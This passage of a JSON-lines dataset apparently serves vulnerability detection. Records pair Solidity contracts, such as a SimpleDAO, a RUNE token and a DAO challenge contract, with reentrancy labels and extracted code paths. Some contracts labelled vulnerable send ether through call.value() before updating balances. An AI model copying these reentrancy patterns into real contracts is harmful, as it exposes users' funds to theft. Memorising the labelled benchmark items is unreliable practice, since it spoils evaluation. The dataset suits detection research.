constant returns (address db) { return certificationDbs[index]; } function registerCertificationDb(address db) fromOwner returns (bool success) { if (db == 0) { throw; } if (!certificationDbStatuses[db].valid) { certificationDbStatuses[db].valid = true; certificationDbStatuses[db].index = certificationDbs.length; certificationDbs.push(db); } LogCertificationDbRegistered(db); success = true; } function unRegisterCertificationDb(address db) fromOwner returns (bool success) { if (certificationDbStatuses[db].valid) { uint256 index = certificationDbStatuses[db].index; certificationDbs[index] = certificationDbs[certificationDbs.length - 1]; certificationDbStatuses[certificationDbs[index]].index = index; delete certificationDbStatuses[db]; certificationDbs.length--; } LogCertificationDbUnRegistered(db); success = true; } function fixBalance() returns (bool success) { return fixBalanceInternal(getBeneficiary()); } } "}
{"sol name": "simple_dao.sol", "label": 1, "first path": "function withdraw(uint amount) public{ if (credit[msg.sender]>= amount) { require(msg.sender.call.value(amount)()); credit[msg.sender]-=amount; ", "second path": "function withdraw(uint amount) public{ if (credit[msg.sender]>= amount) { require(msg.sender.call.value(amount)()); credit[msg.sender]-=amount; ", "third path": "function withdraw(uint amount) public{ if (credit[msg.sender]>= amount) { require(msg.sender.call.value(amount)()); credit[msg.sender]-=amount; ", "long path": "pragma solidity ^0.4.24; contract SimpleDAO { mapping (address => uint) public credit; function donate(address to) payable public{ credit[to] += msg.value; } function withdraw(uint amount) public{ if (credit[msg.sender]>= amount) { require(msg.sender.call.value(amount)()); credit[msg.sender]-=amount; } } function queryCredit(address to) view public returns(uint){ return credit[to]; } } "}
{"sol name": "1403.sol", "label": 1, "first path": "function transfer( address to,   uint value,  bytes data, string custom_fallback ) public returns (bool success)  { _transfer( msg.sender, to, value, data ); if ( isContract(to) ) { ContractReceiver rx = ContractReceiver( to ); require(address(rx).call.value(0)(bytes4(keccak256(custom_fallback)), msg.sender, value, data) ); return true; function transfer(address to, uint256 value) public returns (bool success) { bytes memory empty; _transfer( msg.sender, to, value, empty ); return true; function transferFrom( address from, address to, uint256 value ) public returns (bool success) { require( value <= allowances_[from][msg.sender] ); allowances_[from][msg.sender] -= value; bytes memory empty; _transfer( from, to, value, empty ); return true; function transfer( address to, uint value, bytes data ) public returns (bool success) { if (isContract(to)) { return transferToContract( to, value, data ); _transfer(msg.sender, to, value, data ); return true; function transferToContract( address to, uint value, bytes data ) private returns (bool success) { _transfer(msg.sender, to, value, data ); ContractReceiver rx = ContractReceiver(to); rx.tokenFallback( msg.sender, value, data ); return true; ", "second path": "function transfer( address to,   uint value,  bytes data, string custom_fallback ) public returns (bool success)  { _transfer( msg.sender, to, value, data ); if ( isContract(to) ) { ContractReceiver rx = ContractReceiver( to ); require(address(rx).call.value(0)(bytes4(keccak256(custom_fallback)), msg.sender, value, data) ); return true; function transfer(address to, uint256 value) public returns (bool success) { bytes memory empty; _transfer( msg.sender, to, value, empty ); return true; function transferFrom( address from, address to, uint256 value ) public returns (bool success) { require( value <= allowances_[from][msg.sender] ); allowances_[from][msg.sender] -= value; bytes memory empty; _transfer( from, to, value, empty ); return true; function transfer( address to, uint value, bytes data ) public returns (bool success) { if (isContract(to)) { return transferToContract( to, value, data ); _transfer(msg.sender, to, value, data ); return true; function transferToContract( address to, uint value, bytes data ) private returns (bool success) { _transfer(msg.sender, to, value, data ); ContractReceiver rx = ContractReceiver(to); rx.tokenFallback( msg.sender, value, data ); return true; ", "third path": "function transfer( address to,   uint value,  bytes data, string custom_fallback ) public returns (bool success)  { _transfer( msg.sender, to, value, data ); if ( isContract(to) ) { ContractReceiver rx = ContractReceiver( to ); require(address(rx).call.value(0)(bytes4(keccak256(custom_fallback)), msg.sender, value, data) ); return true; function transfer(address to, uint256 value) public returns (bool success) { bytes memory empty; _transfer( msg.sender, to, value, empty ); return true; function transferFrom( address from, address to, uint256 value ) public returns (bool success) { require( value <= allowances_[from][msg.sender] ); allowances_[from][msg.sender] -= value; bytes memory empty; _transfer( from, to, value, empty ); return true; function transfer( address to, uint value, bytes data ) public returns (bool success) { if (isContract(to)) { return transferToContract( to, value, data ); _transfer(msg.sender, to, value, data ); return true; function transferToContract( address to, uint value, bytes data ) private returns (bool success) { _transfer(msg.sender, to, value, data ); ContractReceiver rx = ContractReceiver(to); rx.tokenFallback( msg.sender, value, data ); return true; ", "long path": "pragma solidity ^0.4.21; interface ContractReceiver { function tokenFallback( address from, uint value, bytes data ) external; } contract SafeMath { function safeSub(uint a, uint b) internal pure returns (uint) { assert(b <= a); return a - b; } function safeAdd(uint a, uint b) internal pure returns (uint) { uint c = a + b; assert(c >= a); return c; } function max64(uint64 a, uint64 b) internal pure returns (uint64) { return a >= b ? a : b; } function min64(uint64 a, uint64 b) internal pure returns (uint64) { return a < b ? a : b; } function max256(uint256 a, uint256 b) internal pure returns (uint256) { return a >= b ? a : b; } function min256(uint256 a, uint256 b) internal pure returns (uint256) { return a < b ? a : b; } } contract RUNEToken is SafeMath { string  public name = \"Rune\"; string  public symbol  = \"RUNE\"; uint256   public decimals  = 18; uint256 public totalSupply  = 1000000000 * (10 ** decimals); mapping( address => uint256 ) balances_; mapping( address => mapping(address => uint256) ) allowances_; function RUNEToken() public { balances_[msg.sender] = totalSupply; emit Transfer( address(0), msg.sender, totalSupply ); } function() public payable { revert(); } event Approval( address indexed owner, address indexed spender, uint value ); event Transfer( address indexed from, address indexed to, uint256 value ); function balanceOf( address owner ) public constant returns (uint) { return balances_[owner]; } function approve( address spender, uint256 value ) public returns (bool success) { allowances_[msg.sender][spender] = value; emit Approval( msg.sender, spender, value ); return true; } function safeApprove( address _spender,uint256 _currentValue,uint256 _value ) public returns (bool success) { if (allowances_[msg.sender][_spender] == _currentValue) return approve(_spender, _value); return false; } function allowance( address owner, address spender ) public constant returns (uint256 remaining) { return allowances_[owner][spender]; } function transfer(address to, uint256 value) public returns (bool success) { bytes memory empty; _transfer( msg.sender, to, value, empty ); return true; } function transferFrom( address from, address to, uint256 value ) public returns (bool success) { require( value <= allowances_[from][msg.sender] ); allowances_[from][msg.sender] -= value; bytes memory empty; _transfer( from, to, value, empty ); return true; } function transfer( address to,   uint value,  bytes data, string custom_fallback ) public returns (bool success)  { _transfer( msg.sender, to, value, data ); if ( isContract(to) ) { ContractReceiver rx = ContractReceiver( to ); require(address(rx).call.value(0)(bytes4(keccak256(custom_fallback)), msg.sender, value, data) ); } return true; } function transfer( address to, uint value, bytes data ) public returns (bool success) { if (isContract(to)) { return transferToContract( to, value, data ); } _transfer(msg.sender, to, value, data ); return true; } function transferToContract( address to, uint value, bytes data ) private returns (bool success) { _transfer(msg.sender, to, value, data ); ContractReceiver rx = ContractReceiver(to); rx.tokenFallback( msg.sender, value, data ); return true; } function isContract( address _addr ) private constant returns (bool) { uint length; assembly { length := extcodesize(_addr) } return (length > 0); } function _transfer( address from, address to, uint value, bytes data ) internal { require( to != 0x0 ); require( balances_[from] >= value ); require( balances_[to] + value > balances_[to] ); balances_[from] -= value; balances_[to] += value; bytes memory empty; empty = data; emit Transfer( from, to, value ); } event Burn( address indexed from, uint256 value ); function burn( uint256 value ) public returns (bool success) { require( balances_[msg.sender] >= value ); balances_[msg.sender] -= value; totalSupply -= value; emit Burn( msg.sender, value ); return true; } function burnFrom( address from, uint256 value ) public returns (bool success) { require( balances_[from] >= value ); require( value <= allowances_[from][msg.sender] ); balances_[from] -= value; allowances_[from][msg.sender] -= value; totalSupply -= value; emit Burn( from, value ); return true; } } "}
{"sol name": "21900.sol", "label": 0, "first path": "function crowdsale() public payable returns (bool) { require(msg.value >= limit); uint256 vv = msg.value; uint256 coin = crowdsalePrice.mul(vv); require(coin.add(totalSupply) <= supplyLimit); require(crowdsaleSupply.add(coin) <= crowdsaleTotal); balances[msg.sender] = coin.add(balances[msg.sender]); totalSupply = totalSupply.add(coin); crowdsaleSupply = crowdsaleSupply.add(coin); balances[msg.sender] = coin; require(owner.call.value(msg.value)()); return true; contract GGPCToken is Crowdsale { string public name = \"Global game payment currency\"; string public symbol = \"GGPC\"; string public version = '1.0.2'; ", "second path": "function crowdsale() public payable returns (bool) { require(msg.value >= limit); uint256 vv = msg.value; uint256 coin = crowdsalePrice.mul(vv); require(coin.add(totalSupply) <= supplyLimit); require(crowdsaleSupply.add(coin) <= crowdsaleTotal); balances[msg.sender] = coin.add(balances[msg.sender]); totalSupply = totalSupply.add(coin); crowdsaleSupply = crowdsaleSupply.add(coin); balances[msg.sender] = coin; require(owner.call.value(msg.value)()); return true; contract GGPCToken is Crowdsale { string public name = \"Global game payment currency\"; string public symbol = \"GGPC\"; string public version = '1.0.2'; ", "third path": "function crowdsale() public payable returns (bool) { require(msg.value >= limit); uint256 vv = msg.value; uint256 coin = crowdsalePrice.mul(vv); require(coin.add(totalSupply) <= supplyLimit); require(crowdsaleSupply.add(coin) <= crowdsaleTotal); balances[msg.sender] = coin.add(balances[msg.sender]); totalSupply = totalSupply.add(coin); crowdsaleSupply = crowdsaleSupply.add(coin); balances[msg.sender] = coin; require(owner.call.value(msg.value)()); return true; contract GGPCToken is Crowdsale { string public name = \"Global game payment currency\"; string public symbol = \"GGPC\"; string public version = '1.0.2'; ", "long path": "pragma solidity ^0.4.16; library SafeMath { function mul(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a * b; assert(a == 0 || c / a == b); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a / b; return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { assert(b <= a); return a - b; } function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; assert(c >= a); return c; } } contract ERC20Basic { uint256 public totalSupply; function balanceOf(address who) public constant returns (uint256); function transfer(address to, uint256 value) public returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); } contract BasicToken is ERC20Basic { using SafeMath for uint256; mapping(address => uint256) balances; function transfer(address _to, uint256 _value) public returns (bool) { require(_to != address(0)); require(_value > 0 && _value <= balances[msg.sender]); balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(_value); Transfer(msg.sender, _to, _value); return true; } function balanceOf(address _owner) public constant returns (uint256 balance) { return balances[_owner]; } } contract ERC20 is ERC20Basic { function allowance(address owner, address spender) public constant returns (uint256); function transferFrom(address from, address to, uint256 value) public returns (bool); function approve(address spender, uint256 value) public returns (bool); event Approval(address indexed owner, address indexed spender, uint256 value); } contract StandardToken is ERC20, BasicToken { mapping (address => mapping (address => uint256)) internal allowed; function transferFrom(address _from, address _to, uint256 _value) public returns (bool) { require(_to != address(0)); require(_value > 0 && _value <= balances[_from]); require(_value <= allowed[_from][msg.sender]); balances[_from] = balances[_from].sub(_value); balances[_to] = balances[_to].add(_value); allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value); Transfer(_from, _to, _value); return true; } function approve(address _spender, uint256 _value) public returns (bool) { allowed[msg.sender][_spender] = _value; Approval(msg.sender, _spender, _value); return true; } function allowance(address _owner, address _spender) public constant returns (uint256 remaining) { return allowed[_owner][_spender]; } } contract Ownable { address public owner; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); function Ownable() public { owner = msg.sender; } modifier onlyOwner() { require(msg.sender == owner); _; } function transferOwnership(address newOwner) onlyOwner public { require(newOwner != address(0)); OwnershipTransferred(owner, newOwner); owner = newOwner; } } contract Pausable is Ownable { event Pause(); event Unpause(); bool public paused = false; modifier whenNotPaused() { require(!paused); _; } modifier whenPaused() { require(paused); _; } function pause() onlyOwner whenNotPaused public { paused = true; Pause(); } function unpause() onlyOwner whenPaused public { paused = false; Unpause(); } } contract PausableToken is StandardToken, Pausable { function transfer(address _to, uint256 _value) public whenNotPaused returns (bool) { return super.transfer(_to, _value); } function transferFrom(address _from, address _to, uint256 _value) public whenNotPaused returns (bool) { return super.transferFrom(_from, _to, _value); } function approve(address _spender, uint256 _value) public whenNotPaused returns (bool) { return super.approve(_spender, _value); } } contract Crowdsale is PausableToken { uint8 public decimals = 18; uint256 public ownerSupply = 18900000000 * (10 ** uint256(decimals)); uint256 public supplyLimit = 21000000000 * (10 ** uint256(decimals)); uint256 public crowdsaleSupply = 0; uint256 public crowdsalePrice = 20000; uint256 public crowdsaleTotal = 2100000000 * (10 ** uint256(decimals)); uint256 public limit = 2 * (10 ** uint256(decimals)); function crowdsale() public payable returns (bool) { require(msg.value >= limit); uint256 vv = msg.value; uint256 coin = crowdsalePrice.mul(vv); require(coin.add(totalSupply) <= supplyLimit); require(crowdsaleSupply.add(coin) <= crowdsaleTotal); balances[msg.sender] = coin.add(balances[msg.sender]); totalSupply = totalSupply.add(coin); crowdsaleSupply = crowdsaleSupply.add(coin); balances[msg.sender] = coin; require(owner.call.value(msg.value)()); return true; } } contract GGPCToken is Crowdsale { string public name = \"Global game payment currency\"; string public symbol = \"GGPC\"; string public version = '1.0.2'; function GGPCToken() public { totalSupply = ownerSupply; balances[msg.sender] = ownerSupply; } function () public { revert(); } } "}
{"sol name": "17518.sol", "label": 0, "first path": "function sendTransaction(address to, uint256 value, bytes data) public onlyOwner returns (bool) { return to.call.value(value)(data); ", "second path": "function sendTransaction(address to, uint256 value, bytes data) public onlyOwner returns (bool) { return to.call.value(value)(data); ", "third path": "function sendTransaction(address to, uint256 value, bytes data) public onlyOwner returns (bool) { return to.call.value(value)(data); ", "long path": "pragma solidity ^0.4.19; contract Ownable { address public owner; modifier onlyOwner() { require(msg.sender == owner); _; } function Ownable() public { owner = msg.sender; } function transferTo(address _to) public onlyOwner returns (bool) { require(_to != address(0)); owner = _to; return true; } } contract Delegable is Ownable { mapping(address => DelegateLog) public delegates; struct DelegateLog { uint256 started; uint256 ended; } modifier onlyDelegate() { DelegateLog memory delegateLog = delegates[msg.sender]; require(delegateLog.started != 0 && delegateLog.ended == 0); _; } function wasDelegate(address _address, uint256 timestamp) public view returns (bool) { DelegateLog memory delegateLog = delegates[_address]; return timestamp >= delegateLog.started && delegateLog.started != 0 && (delegateLog.ended == 0 || timestamp < delegateLog.ended); } function isDelegate(address _address) public view returns (bool) { DelegateLog memory delegateLog = delegates[_address]; return delegateLog.started != 0 && delegateLog.ended == 0; } function addDelegate(address _address) public onlyOwner returns (bool) { DelegateLog storage delegateLog = delegates[_address]; require(delegateLog.started == 0); delegateLog.started = block.timestamp; return true; } function removeDelegate(address _address) public onlyOwner returns (bool) { DelegateLog storage delegateLog = delegates[_address]; require(delegateLog.started != 0 && delegateLog.ended == 0); delegateLog.ended = block.timestamp; return true; } } contract Oracle is Ownable { uint256 public constant VERSION = 4; event NewSymbol(bytes32 _currency); mapping(bytes32 => bool) public supported; bytes32[] public currencies; function url() public view returns (string); function getRate(bytes32 symbol, bytes data) public returns (uint256 rate, uint256 decimals); function addCurrency(string ticker) public onlyOwner returns (bool) { bytes32 currency = encodeCurrency(ticker); NewSymbol(currency); supported[currency] = true; currencies.push(currency); return true; } function encodeCurrency(string currency) public pure returns (bytes32 o) { require(bytes(currency).length <= 32); assembly { o := mload(add(currency, 32)) } } function decodeCurrency(bytes32 b) public pure returns (string o) { uint256 ns = 256; while (true) { if (ns == 0 || (b<<ns-8) != 0) break; ns -= 8; } assembly { ns := div(ns, 8) o := mload(0x40) mstore(0x40, add(o, and(add(add(ns, 0x20), 0x1f), not(0x1f)))) mstore(o, ns) mstore(add(o, 32), b) } } } contract RipioOracle is Oracle, Delegable { uint256 public expiration = 15 minutes; uint constant private INDEX_TIMESTAMP = 0; uint constant private INDEX_RATE = 1; uint constant private INDEX_DECIMALS = 2; uint constant private INDEX_V = 3; uint constant private INDEX_R = 4; uint constant private INDEX_S = 5; string private infoUrl; mapping(bytes32 => RateCache) private cache; address public fallback; struct RateCache { uint256 timestamp; uint256 rate; uint256 decimals; } function url() public view returns (string) { return infoUrl; } function setExpirationTime(uint256 time) public onlyOwner returns (bool) { expiration = time; return true; } function setUrl(string _url) public onlyOwner returns (bool) { infoUrl = _url; return true; } function setFallback(address _fallback) public onlyOwner returns (bool) { fallback = _fallback; return true; } function readBytes32(bytes data, uint256 index) internal pure returns (bytes32 o) { if(data.length / 32 > index) { assembly { o := mload(add(data, add(32, mul(32, index)))) } } } function sendTransaction(address to, uint256 value, bytes data) public onlyOwner returns (bool) { return to.call.value(value)(data); } function getRate(bytes32 currency, bytes data) public returns (uint256, uint256) { if (fallback != address(0)) { return Oracle(fallback).getRate(currency, data); } uint256 timestamp = uint256(readBytes32(data, INDEX_TIMESTAMP)); require(timestamp <= block.timestamp); uint256 expirationTime = block.timestamp - expiration; if (cache[currency].timestamp >= timestamp && cache[currency].timestamp >= expirationTime) { return (cache[currency].rate, cache[currency].decimals); } else { require(timestamp >= expirationTime); uint256 rate = uint256(readBytes32(data, INDEX_RATE)); uint256 decimals = uint256(readBytes32(data, INDEX_DECIMALS)); uint8 v = uint8(readBytes32(data, INDEX_V)); bytes32 r = readBytes32(data, INDEX_R); bytes32 s = readBytes32(data, INDEX_S); bytes32 _hash = keccak256(this, currency, rate, decimals, timestamp); address signer = ecrecover(keccak256(\"\\x19Ethereum Signed Message:\\n32\", _hash),v,r,s); require(isDelegate(signer)); cache[currency] = RateCache(timestamp, rate, decimals); return (rate, decimals); } } } "}
{"sol name": "32559.sol", "label": 0, "first path": "function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) { if(isContract(_to)) { require(Balances(balancesContract()).get(msg.sender) >= _value); Balances(balancesContract()).transfer(msg.sender, _to, _value); ContractReceiver receiver = ContractReceiver(_to); require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data)); Transfer(msg.sender, _to, _value); Transfer(msg.sender, _to, _value, _data); return true; } else { return transferToAddress(_to, _value, _data); ", "second path": "function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) { if(isContract(_to)) { require(Balances(balancesContract()).get(msg.sender) >= _value); Balances(balancesContract()).transfer(msg.sender, _to, _value); ContractReceiver receiver = ContractReceiver(_to); require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data)); Transfer(msg.sender, _to, _value); Transfer(msg.sender, _to, _value, _data); return true; } else { return transferToAddress(_to, _value, _data); ", "third path": "function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) { if(isContract(_to)) { require(Balances(balancesContract()).get(msg.sender) >= _value); Balances(balancesContract()).transfer(msg.sender, _to, _value); ContractReceiver receiver = ContractReceiver(_to); require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data)); Transfer(msg.sender, _to, _value); Transfer(msg.sender, _to, _value, _data); return true; } else { return transferToAddress(_to, _value, _data); ", "long path": "pragma solidity ^0.4.18; contract useContractWeb { ContractWeb internal web = ContractWeb(0x0); } contract Owned { address public owner = msg.sender; function transferOwner(address _newOwner) onlyOwner public returns (bool) { owner = _newOwner; return true; } modifier onlyOwner { require(msg.sender == owner); _; } } contract CheckPayloadSize { modifier onlyPayloadSize(uint256 _size) { require(msg.data.length >= _size + 4); _; } } contract CanTransferTokens is CheckPayloadSize, Owned { function transferCustomToken(address _token, address _to, uint256 _value) onlyPayloadSize(3 * 32) onlyOwner public returns (bool) { Token tkn = Token(_token); return tkn.transfer(_to, _value); } } contract SafeMath { function add(uint256 x, uint256 y) pure internal returns (uint256) { require(x <= x + y); return x + y; } function sub(uint256 x, uint256 y) pure internal returns (uint256) { require(x >= y); return x - y; } } contract CheckIfContract { function isContract(address _addr) view internal returns (bool) { uint256 length; if (_addr == address(0x0)) return false; assembly { length := extcodesize(_addr) } if(length > 0) { return true; } else { return false; } } } contract ContractReceiver { TKN internal fallback; struct TKN { address sender; uint256 value; bytes data; bytes4 sig; } function getFallback() view public returns (TKN) { return fallback; } function tokenFallback(address _from, uint256 _value, bytes _data) public returns (bool) { TKN memory tkn; tkn.sender = _from; tkn.value = _value; tkn.data = _data; uint32 u = uint32(_data[3]) + (uint32(_data[2]) << 8) + (uint32(_data[1]) << 16) + (uint32(_data[0]) << 24); tkn.sig = bytes4(u); fallback = tkn; return true; } } contract Token1st { address public currentTradingSystem; address public currentExchangeSystem; mapping(address => uint) public balanceOf; mapping(address => mapping (address => uint)) public allowance; mapping(address => mapping (address => uint)) public tradingBalanceOf; mapping(address => mapping (address => uint)) public exchangeBalanceOf; function getBalanceOf(address _address) view public returns (uint amount){ return balanceOf[_address]; } event Transfer (address _to, address _from, uint _decimalAmount); function transferDecimalAmountFrom(address _from, address _to, uint _value) public returns (bool success) { require(balanceOf[_from] - tradingBalanceOf[_from][currentTradingSystem] - exchangeBalanceOf[_from][currentExchangeSystem] >= _value); require(balanceOf[_to] + (_value) >= balanceOf[_to]); require(_value <= allowance[_from][msg.sender]); balanceOf[_from] -= _value; balanceOf[_to] += _value; allowance[_from][msg.sender] -= _value; Transfer(_to, _from, _value); return true; } function approveSpenderDecimalAmount(address _spender, uint _value) public returns (bool success) { allowance[msg.sender][_spender] = _value; return true; } } contract ContractWeb is CanTransferTokens, CheckIfContract { mapping(string => contractInfo) internal contracts; event ContractAdded(string _name, address _referredTo); event ContractEdited(string _name, address _referredTo); event ContractMadePermanent(string _name); struct contractInfo { address contractAddress; bool isPermanent; } function getContractAddress(string _name) view public returns (address) { return contracts[_name].contractAddress; } function isContractPermanent(string _name) view public returns (bool) { return contracts[_name].isPermanent; } function setContract(string _name, address _address) onlyPayloadSize(2 * 32) onlyOwner public returns (bool) { require(isContract(_address)); require(this != _address); require(contracts[_name].contractAddress != _address); require(contracts[_name].isPermanent == false); address oldAddress = contracts[_name].contractAddress; contracts[_name].contractAddress = _address; if(oldAddress == address(0x0)) { ContractAdded(_name, _address); } else { ContractEdited(_name, _address); } return true; } function makeContractPermanent(string _name) onlyOwner public returns (bool) { require(contracts[_name].contractAddress != address(0x0)); require(contracts[_name].isPermanent == false); contracts[_name].isPermanent = true; ContractMadePermanent(_name); return true; } function tokenSetup(address _Tokens1st, address _Balancecs, address _Token, address _Conversion, address _Distribution) onlyPayloadSize(5 * 32) onlyOwner public returns (bool) { setContract(\"Token1st\", _Tokens1st); setContract(\"Balances\", _Balancecs); setContract(\"Token\", _Token); setContract(\"Conversion\", _Conversion); setContract(\"Distribution\", _Distribution); return true; } } contract Balances is CanTransferTokens, SafeMath, useContractWeb { mapping(address => uint256) internal _balances; function get(address _account) view public returns (uint256) { return _balances[_account]; } function tokenContract() view public returns (address) { return web.getContractAddress(\"Token\"); } function Balances() public { _balances[msg.sender] = 190 * 1000000 * 1000000000000000000; } modifier onlyToken { require(msg.sender == tokenContract()); _; } function transfer(address _from, address _to, uint256 _value) onlyPayloadSize(3 * 32) onlyToken public returns (bool success) { _balances[_from] = sub(_balances[_from], _value); _balances[_to] = add(_balances[_to], _value); return true; } } contract Token is CanTransferTokens, SafeMath, CheckIfContract, useContractWeb { string public symbol = \"SHC\"; string public name = \"ShineCoin\"; uint8 public decimals = 18; uint256 public totalSupply = 190 * 1000000 * 1000000000000000000; mapping (address => mapping (address => uint256)) internal _allowance; event Approval(address indexed from, address indexed to, uint256 value); event Transfer(address indexed from, address indexed to, uint256 value); event Transfer(address indexed from, address indexed to, uint256 value, bytes indexed data); function balanceOf(address _account) view public returns (uint256) { return Balances(balancesContract()).get(_account); } function allowance(address _from, address _to) view public returns (uint256 remaining) { return _allowance[_from][_to]; } function balancesContract() view public returns (address) { return web.getContractAddress(\"Balances\"); } function Token() public { bytes memory empty; Transfer(this, msg.sender, 190 * 1000000 * 1000000000000000000); Transfer(this, msg.sender, 190 * 1000000 * 1000000000000000000, empty); } function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) { if(isContract(_to)) { require(Balances(balancesContract()).get(msg.sender) >= _value); Balances(balancesContract()).transfer(msg.sender, _to, _value); ContractReceiver receiver = ContractReceiver(_to); require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data)); Transfer(msg.sender, _to, _value); Transfer(msg.sender, _to, _value, _data); return true; } else { return transferToAddress(_to, _value, _data); } } function transfer(address _to, uint256 _value, bytes _data) onlyPayloadSize(3 * 32) public returns (bool success) { if(isContract(_to)) { return transferToContract(_to, _value, _data); } else { return transferToAddress(_to, _value, _data); } } function transfer(address _to, uint256 _value) onlyPayloadSize(2 * 32) public returns (bool success) { bytes memory empty; if(isContract(_to)) { return transferToContract(_to, _value, empty); } else { return transferToAddress(_to, _value, empty); } } function transferToAddress(address _to, uint256 _value, bytes _data) internal returns (bool success) { require(Balances(balancesContract()).get(msg.sender) >= _value); Balances(balancesContract()).transfer(msg.sender, _to, _value); Transfer(msg.sender, _to, _value); Transfer(msg.sender, _to, _value, _data); return true; } function transferToContract(address _to, uint256 _value, bytes _data) internal returns (bool success) { require(Balances(balancesContract()).get(msg.sender) >= _value); Balances(balancesContract()).transfer(msg.sender, _to, _value); ContractReceiver receiver = ContractReceiver(_to); receiver.tokenFallback(msg.sender, _value, _data); Transfer(msg.sender, _to, _value); Transfer(msg.sender, _to, _value, _data); return true; } function transferFrom(address _from, address _to, uint256 _value) onlyPayloadSize(3 * 32) public returns (bool) { bytes memory empty; require(_value > 0 && _allowance[_from][msg.sender] >= _value && Balances(balancesContract()).get(_from) >= _value); _allowance[_from][msg.sender] = sub(_allowance[_from][msg.sender], _value); if(msg.sender != _to && isContract(_to)) { Balances(balancesContract()).transfer(_from, _to, _value); ContractReceiver receiver = ContractReceiver(_to); receiver.tokenFallback(_from, _value, empty); } else { Balances(balancesContract()).transfer(_from, _to, _value); } Transfer(_from, _to, _value); Transfer(_from, _to, _value, empty); return true; } function approve(address _to, uint256 _value) onlyPayloadSize(2 * 32) public returns (bool) { _allowance[msg.sender][_to] = add(_allowance[msg.sender][_to], _value); Approval(msg.sender, _to, _value); return true; } } contract Conversion is CanTransferTokens, useContractWeb { function token1stContract() view public returns (address) { return web.getContractAddress(\"Token1st\"); } function tokenContract() view public returns (address) { return web.getContractAddress(\"Token\"); } function deposit() onlyOwner public returns (bool) { require(Token(tokenContract()).allowance(owner, this) > 0); return Token(tokenContract()).transferFrom(owner, this, Token(tokenContract()).allowance(owner, this)); } function convert() public returns (bool) { uint256 senderBalance = Token1st(token1stContract()).getBalanceOf(msg.sender); require(Token1st(token1stContract()).allowance(msg.sender, this) >= senderBalance); Token1st(token1stContract()).transferDecimalAmountFrom(msg.sender, owner, senderBalance); return Token(tokenContract()).transfer(msg.sender, senderBalance * 10000000000); } } contract Distribution is CanTransferTokens, SafeMath, useContractWeb { uint256 public liveSince; uint256 public withdrawn; function withdrawnReadable() view public returns (uint256) { return withdrawn / 1000000000000000000; } function secondsLive() view public returns (uint256) { if(liveSince != 0) { return now - liveSince; } } function allowedSince() view public returns (uint256) { return secondsLive() * 380265185769276972; } function allowedSinceReadable() view public returns (uint256) { return secondsLive() * 380265185769276972 / 1000000000000000000; } function stillAllowed() view public returns (uint256) { return allowedSince() - withdrawn; } function stillAllowedReadable() view public returns (uint256) { uint256 _1 = allowedSince() - withdrawn; return _1 / 1000000000000000000; } function tokenContract() view public returns (address) { return web.getContractAddress(\"Token\"); } function makeLive() onlyOwner public returns (bool) { require(liveSince == 0); liveSince = now; return true; } function deposit() onlyOwner public returns (bool) { require(Token(tokenContract()).allowance(owner, this) > 0); return Token(tokenContract()).transferFrom(owner, this, Token(tokenContract()).allowance(owner, this)); } function transfer(address _to, uint256 _value) onlyPayloadSize(2 * 32) onlyOwner public returns (bool) { require(stillAllowed() >= _value && _value > 0 && liveSince != 0); withdrawn = add(withdrawn, _value); return Token(tokenContract()).transfer(_to, _value); } function transferReadable(address _to, uint256 _value) onlyPayloadSize(2 * 32) onlyOwner public returns (bool) { require(stillAllowed() >= _value * 1000000000000000000 && stillAllowed() != 0 && liveSince != 0); withdrawn = add(withdrawn, _value * 1000000000000000000); return Token(tokenContract()).transfer(_to, _value * 1000000000000000000); } } "}
{"sol name": "40118.sol", "label": 0, "first path": "function withdrawEtherOrThrow(uint256 amount) private { if (msg.sender != owner) throw; bool result = owner.call.value(amount)(); if (!result) { throw;} function refund() noEther onlyOwner { if (tokenBalance == 0) throw; tokenBalance = 0; withdrawEtherOrThrow(tokenBalance * tokenPrice); ", "second path": "function withdrawEtherOrThrow(uint256 amount) private { if (msg.sender != owner) throw; bool result = owner.call.value(amount)(); if (!result) { throw;} function refund() noEther onlyOwner { if (tokenBalance == 0) throw; tokenBalance = 0; withdrawEtherOrThrow(tokenBalance * tokenPrice); ", "third path": "function withdrawEtherOrThrow(uint256 amount) private { if (msg.sender != owner) throw; bool result = owner.call.value(amount)(); if (!result) { throw;} function refund() noEther onlyOwner { if (tokenBalance == 0) throw; tokenBalance = 0; withdrawEtherOrThrow(tokenBalance * tokenPrice); ", "long path": "contract DaoAccount { uint256 constant tokenPrice = 1000000000000000; uint256 public tokenBalance; address owner; address daoChallenge; address challengeOwner; modifier noEther() {if (msg.value > 0) throw; _;} modifier onlyOwner() {if (owner != msg.sender) throw; _;} modifier onlyChallengeOwner() {if (challengeOwner != msg.sender) throw; _;} function DaoAccount (address _owner, address _challengeOwner) { owner = _owner; daoChallenge = msg.sender; challengeOwner = _challengeOwner; } function () onlyOwner returns (uint256 newBalance){ uint256 amount = msg.value; if (amount % tokenPrice != 0) { throw; } uint256 tokens = amount / tokenPrice; tokenBalance += tokens; return tokenBalance; } function withdrawEtherOrThrow(uint256 amount) private { if (msg.sender != owner) throw; bool result = owner.call.value(amount)(); if (!result) { throw;} } function refund() noEther onlyOwner { if (tokenBalance == 0) throw; tokenBalance = 0; withdrawEtherOrThrow(tokenBalance * tokenPrice); } function terminate() noEther onlyChallengeOwner { suicide(challengeOwner); } } contract DaoChallenge { event notifyTerminate(uint256 finalBalance); address owner; mapping (address => DaoAccount) private daoAccounts; modifier noEther() {if (msg.value > 0) throw; _;} modifier 